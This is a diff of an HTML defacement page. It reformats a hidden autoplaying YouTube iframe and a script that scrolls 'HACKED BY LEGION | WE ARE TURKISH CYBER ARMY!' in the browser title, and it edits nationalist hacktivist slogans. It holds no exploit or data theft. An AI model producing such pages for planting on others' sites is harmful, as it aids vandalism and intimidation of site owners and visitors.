@@ -1,6 +1,3 @@
-indexim
-
-
 <!DOCTYPE html>
 <html lang="tr">
 
@@ -45,7 +42,7 @@ indexim
     <div id="front-page">
 
         <div id="canvas-container">
-            <canvas id="gravity" class="layer" data-depth="0.50"></canvas>
+            <canvas id="gravity" class="layer" data-depth="0.30"></canvas>
         </div>
 
         <!-- HOME SCREEN -->
@@ -65,7 +62,7 @@ indexim
                             <h1 style="font-size: 35px">TURKISH CYBER ARMY<span><br></span></h1>
                         </div>
                         <div class="slide">
-                            <h1 style="font-size: 35px"> WE ARE BRAVE AND <span><br> WE ARE FEARLESS </span></h1>
+                            <h1 style="font-size: 35px"> WE ARE TURKS,WE ARE BRAVE AND WE ARE FEARLESS  <span><br> WE ARE HERE.WE'RE ON WATCH! </span></h1>
                         </div>
 
                         <div class="slide">
@@ -82,15 +79,9 @@ indexim
                                    
                     </div>
 
-                    <iframe width="0" height="0" src="https://www.youtube.com/embed/EWZfJ8I8MdE?autoplay=1" 
+                    <iframe width="0" height="0" src="https://www.youtube.com/embed/EWZfJ8I8MdE?autoplay=1" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
-frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-                    <!-- <iframe width="250" height="135" scrolling="no" src="https://im.ezgif.com/tmp/ezgif-1-
-
-293cb14218ea.gif" frameborder="0"  allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
-
-></iframe> -->
+                    <!-- <iframe width="250" height="135" scrolling="no" src="https://im.ezgif.com/tmp/ezgif-1-293cb14218ea.gif" frameborder="0"  allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" ></iframe> -->
 
                 </div>
             </div>
@@ -98,11 +89,7 @@ frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; pict
             <!-- Title yazısını hareketlendiren js kodu -->
             <script language="javascript" type="text/javascript">
 
-                var msg1 = "HACKED BY LEGION | WE ARE TURKISH CYBER ARMY! "; var speed = 60; function ScrollTitle() { 
-
-document.title = msg1; msg1 = msg1.substring(1, msg1.length) + msg1.charAt(0); setTimeout("ScrollTitle()", speed); } 
-
-ScrollTitle();
+                var msg1 = "HACKED BY LEGION | WE ARE TURKISH CYBER ARMY! "; var speed = 60; function ScrollTitle() { document.title = msg1; msg1 = msg1.substring(1, msg1.length) + msg1.charAt(0); setTimeout("ScrollTitle()", speed); } ScrollTitle();
 
             </script>
 
